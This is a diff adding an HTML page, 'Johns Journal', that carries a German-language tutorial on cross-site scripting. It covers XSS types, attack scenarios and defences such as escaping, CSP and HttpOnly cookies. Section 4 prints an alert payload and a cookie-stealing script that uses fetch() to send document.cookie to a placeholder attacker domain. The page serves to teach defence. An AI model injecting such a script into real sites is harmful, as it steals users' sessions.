@@ -1,0 +1,219 @@
+<!DOCTYPE HTML>
+<!--
+	Phantom by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>XSS</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="is-preload">
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Header -->
+					<header id="header">
+						<div class="inner">
+
+							<!-- Logo -->
+								<a href="index.html" class="logo">
+									<span class="symbol"><img src="images/logo.svg" alt="" /></span><span class="title">Johns Journal</span>
+								</a>
+
+							<!-- Nav -->
+								<nav>
+									<ul>
+										<li><a href="#menu">Menu</a></li>
+									</ul>
+								</nav>
+
+						</div>
+					</header>
+
+				<!-- Menu -->
+					<nav id="menu">
+						<h2>Menu</h2>
+						<ul>
+							<li><a href="index.html">Home</a></li>
+							<li><a href="passwords.html">Zugangsdaten</a></li>
+						</ul>
+					</nav>
+
+				<!-- Main -->
+					<div id="main">
+						<div class="inner">
+							<h1>XSS – Der JavaScript-Albtraum</h1>
+							<span class="image main"><img src="images/xss.png" alt="" /></span>
+                            <p>
+                                Cross-Site Scripting (XSS) ist eine der am häufigsten vorkommenden Sicherheitslücken im Web und 
+                                doch unterschätzen viele Administratoren und Entwickler das Gefahrenpotenzial. Bei einem erfolgreichen 
+                                XSS-Angriff wird fremder JavaScript-Code auf einer Webseite ausgeführt, ohne dass der Betreiber oder 
+                                andere Nutzer es merken. Auf diese Weise können Angreifer Cookies stehlen, Sitzungen übernehmen, 
+                                Schadcode platzieren und in manchen Fällen sogar ganze Benutzerkonten kapern.
+                            </p>
+                        
+                            <h2>1. Funktionsweise von XSS</h2>
+                            <p>
+                                Das Grundproblem bei XSS ist, dass Benutzereingaben oder dynamische Inhalte einer Webseite nicht 
+                                korrekt gefiltert oder „escaped“ werden. Wenn ein Angreifer es schafft, Skriptcode in den HTML-Baum 
+                                einer Seite einzuschleusen, führt der Browser diesen Code so aus, als käme er vom legitimen Server. 
+                                Damit gelten dessen Sicherheits- und Zugriffsrechte. 
+                            </p>
+                            <p>
+                                Typische Einfallstore sind Kommentarfunktionen, Foren- oder Chat-Beiträge, Suchfelder oder 
+                                Benutzernamen-Eingaben. Sobald diese Inhalte anschließend unverändert an andere Besucher ausgeliefert 
+                                werden, läuft das hinterlegte Skript im Kontext der Website, was potentiell sehr gefährlich ist.
+                            </p>
+                        
+                            <h2>2. Verschiedene Arten von XSS</h2>
+                            <ul>
+                                <li>
+                                    <strong>Reflected XSS</strong>: 
+                                    Hier wird der bösartige Code „reflektiert“, indem er als Teil einer URL oder Formular-Eingabe 
+                                    zurück an den Browser geschickt wird. Das passiert oft, wenn Such- oder Login-Formulare 
+                                    Eingaben direkt zurück auf die Seite schreiben, ohne sie zu entschärfen.
+                                </li>
+                                <li>
+                                    <strong>Stored (persistentes) XSS</strong>: 
+                                    Bei dieser Variante wird der Schadvorgang dauerhaft in der Datenbank oder im Dateisystem 
+                                    abgelegt – beispielsweise in einem Kommentarfeld, das von anderen Besuchern gelesen wird. 
+                                    Jeder Seitenaufruf kann so den gleichen bösartigen Code ausführen.
+                                </li>
+                                <li>
+                                    <strong>DOM-based XSS</strong>: 
+                                    Hier findet die Manipulation ausschließlich im Document Object Model (DOM) statt – 
+                                    ohne dass es zu einem klassischen Seiten-Reload kommt. JavaScript-Funktionen, die 
+                                    dynamische Inhalte verarbeiten und ins DOM einfügen, können so zum Einfallstor werden.
+                                </li>
+                            </ul>
+                        
+                            <h2>3. Häufige Angriffsszenarien</h2>
+                            <p>
+                                XSS kann in sehr unterschiedlichen Formen auftreten. Einige typische Situationen:
+                            </p>
+                            <ul>
+                                <li>
+                                    <strong>Session Hijacking</strong>: 
+                                    Ein Skript liest das <code>document.cookie</code> aus und schickt die Session-ID 
+                                    an den Angreifer. Anschließend kann dieser sich als Opfer ausgeben.
+                                </li>
+                                <li>
+                                    <strong>Keylogging</strong>: 
+                                    Über ein eingebettetes Skript können Tastatureingaben oder Formulardaten live an einen 
+                                    fremden Server gesendet werden.
+                                </li>
+                                <li>
+                                    <strong>Phishing</strong>: 
+                                    Der Angreifer manipuliert die angezeigte Seite (z. B. ein gefälschtes Login-Feld) und 
+                                    täuscht so den Nutzer, um dessen Zugangsdaten zu stehlen.
+                                </li>
+                                <li>
+                                    <strong>Drive-by-Downloads</strong>: 
+                                    Ein XSS-Skript kann Browser-Exploits initiieren oder den Download schadhafter Dateien 
+                                    anstoßen, um ein System zu kompromittieren.
+                                </li>
+                            </ul>
+                        
+                            <h2>4. Beispiel für einen einfachen XSS-Payload</h2>
+                            <p>
+                                In seiner simpelsten Form kann ein XSS-Angriff bereits mit einem einfachen 
+                                <code>&lt;script&gt;</code>-Tag erfolgen. Nehmen wir an, ein Forum speichert und zeigt 
+                                Kommentare ohne Filterung an. Ein Angreifer könnte Folgendes posten:
+                            </p>
+                            <pre><code>&lt;script&gt;alert('XSS erfolgreich!')&lt;/script&gt;</code></pre>
+                            <p>
+                                Jede Person, die nun diesen Forenbeitrag aufruft, bekommt einen JavaScript-Alarm angezeigt. 
+                                Dies ist zwar „nur“ ein Warnhinweis, zeigt aber, dass fremder Code ausgeführt werden kann. 
+                                Ein Angreifer würde stattdessen natürlich Schadfunktionen einbetten, wie das Stehlen 
+                                von Cookies:
+                            </p>
+                            <pre><code>&lt;script&gt;
+                        fetch('https://böse-seite.de/steal?cookie=' + document.cookie);
+                        &lt;/script&gt;
+                        </code></pre>
+                        
+                            <h2>5. Schutzmaßnahmen gegen XSS</h2>
+                            <p>
+                                Um XSS zu verhindern, müssen Entwickler sicherstellen, dass Benutzereingaben niemals 
+                                ungefiltert ausgegeben werden. Zu den wichtigsten Gegenmaßnahmen gehören:
+                            </p>
+                            <ul>
+                                <li>
+                                    <strong>HTML Escaping</strong> aller dynamischen Inhalte. Zum Beispiel sollte aus 
+                                    <code>&lt;script&gt;</code> automatisch <code>&amp;lt;script&amp;gt;</code> werden, 
+                                    damit es nicht als Code ausgeführt wird.
+                                </li>
+                                <li>
+                                    <strong>Content Security Policy (CSP)</strong>: 
+                                    Damit lässt sich definieren, von welchen Quellen Skripte überhaupt geladen werden dürfen. 
+                                    Auf diese Weise können Inline-Skripte oder fremde Domains blockiert werden.
+                                </li>
+                                <li>
+                                    <strong>HTTP-Only Cookies</strong>: 
+                                    Diese Cookies sind vor JavaScript-Zugriff geschützt und lassen sich nicht einfach 
+                                    per <code>document.cookie</code> auslesen.
+                                </li>
+                                <li>
+                                    <strong>Template-Engines nutzen</strong>, die automatisch escaping vornehmen, 
+                                    damit kein bösartiger Code ins DOM gelangt.
+                                </li>
+                            </ul>
+                        
+                            <h2>6. Warum XSS so ernst zu nehmen ist</h2>
+                            <p>
+                                Der größte Reiz für Angreifer liegt darin, dass sie direkt im Browser des Opfers agieren. 
+                                Das bedeutet, sie haben Zugriff auf dieselben Ressourcen und Sitzungsinformationen wie 
+                                der angemeldete Nutzer. Gerade bei sensiblen Webanwendungen wie E-Banking, Online-Shops 
+                                oder internen Tools kann dies verheerende Folgen haben. 
+                            </p>
+                            <p>
+                                Darüber hinaus sind XSS-Lücken häufig einfacher auszunutzen als andere Schwachstellen. 
+                                Man benötigt oft keine tiefgreifenden Kenntnisse in Serverarchitekturen oder 
+                                Kryptografie – es reicht, dass eine Webseite die Nutzereingaben nicht sauber behandelt.
+                            </p>
+                        
+                            <h2>7. Fazit</h2>
+                            <p>
+                                Cross-Site Scripting wird oft unterschätzt, weil es im Vergleich zu anderen Hacking-Methoden 
+                                weniger aufwändig erscheint. Tatsächlich ist es jedoch eine sehr effektive 
+                                Angriffstechnik, um Daten zu stehlen, Phishing zu betreiben oder Schadcode zu verteilen. 
+                                Da jede Browser-Session quasi im „Vertrauenskontext“ der besuchten Seite läuft, 
+                                stellt XSS eine massive Gefahr für Anwender und Betreiber dar.
+                            </p>
+                            <p>
+                                Die wichtigste Botschaft: Wer Software oder Webprojekte entwickelt, sollte XSS 
+                                unbedingt von Anfang an berücksichtigen und seine Formulare absichern. 
+                                So entsteht erst gar nicht die Möglichkeit, Skripte heimlich einzuschleusen. 
+                                Denn ein kleiner Tag mit großer Wirkung kann ausreichen, um das gesamte Vertrauen 
+                                einer Anwendung zu erschüttern.
+                            </p>
+                            </div>
+					</div>
+
+				<!-- Footer -->
+					<footer id="footer">
+						<div class="inner">
+						
+							
+							<ul class="copyright">
+								<li>&copy; Untitled. All rights reserved</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+							</ul>
+						</div>
+					</footer>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
